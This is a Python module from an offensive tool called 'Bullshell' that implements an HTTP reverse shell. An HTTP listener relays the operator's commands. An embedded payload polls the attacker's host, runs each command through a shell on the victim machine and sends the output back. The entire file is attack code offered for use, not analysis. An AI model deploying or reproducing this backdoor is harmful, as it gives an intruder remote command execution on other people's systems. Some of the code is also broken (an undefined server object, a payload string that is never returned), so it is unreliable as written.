
#basic module description
def description():
    return "HTTP reverse shell"

#basic module rank
def rank():
    return "Excellent"

#basic module date
def date():
    return "01.05.2026"

#set arguments
def depargs():
    return {
        "host": "IPv4 addr",
        "port": "Port"
    }

#imports
from typing import Any
from listener import Listen
from StrFuncs import err, evnt, timenow, beautip
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, Style

#main function
class shell(BaseHTTPRequestHandler):
    def log_message(self, format: str, *args: Any) -> None:
        return

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        cmd = str(input(f"{Fore.RED}Bullshell>{Style.RESET_ALL} "))
        self.wfile.write(cmd.encode())

    def do_POST(self):
        length = int(self.headers["Content-Length"])
        data = self.rfile.read(length).decode("utf-8")
        if data.strip():
            print(data)
        self.send_response(200)
        self.end_headers()

#launch func
def launch(args: dict):
    host = args.get("host", "0.0.0.0")
    port = int(args.get("port", 8080))
    try:
        Listen(host, port, "http")
        print(f"{evnt()} HTTP server started on {beautip(host)}:{Fore.CYAN}{str(port)}{Style.RESET_ALL}")
        server.serve_forever()
    except Exception as error:
        print(f"{err()} {error}")

def code(rhost: str, rport: int):
    f"""import urllib.request
import subprocess, os

server_url = "http://{rhost}:{rport}/"
while True:
    try:
        req = urllib.request.Request(server_url)
        response = urllib.request.urlopen(req)
        cmd = response.read().decode().strip()
        if cmd:
            if cmd.lower() == "terminate":
                break
            elif cmd.lower().startswith("cd "):
                path = cmd[3:]
                os.chdir(path=path)
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
        else:
            result = ""
        data = urllib.request.urlopen(server_url, data=result.encode())
    except Exception:
        pass
"""
